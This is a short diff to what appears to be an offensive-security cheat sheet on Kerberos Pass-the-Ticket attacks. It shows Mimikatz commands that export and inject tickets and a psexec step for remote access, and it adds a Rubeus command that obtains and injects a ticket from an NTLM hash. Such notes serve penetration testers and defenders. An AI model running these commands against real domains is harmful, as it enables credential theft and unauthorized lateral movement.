@@ -291,9 +291,13 @@ Pass-the-Ticket takes advantage of the TGS by exporting service tickets, injecti
 
 PTT via. COMPROMISED HOST (exporting -> inject into memory -> psexec.exe)
 ```powershell
+# METHOD 1: Mimikatz
 mimikatz> sekurlsa::tickets /export          # export tickets
 mimikatz> kerberos::ptt [ticket_name.kirbi]  # inject into memory
 cmd> psexec.exe \\target.hostname.com cmd    # authN to remote target using ticket
+
+# METHOD 2: Rubeus
+cmd> Rubeus.exe asktgt /domain:<domain_name> /user:<user_name> /rc4:<ntlm_hash> /ptt
 ```
 
 PTT via. KALI (exporting -> cache as env var -> psexec.py/smbexec.py/wmiexec.py)
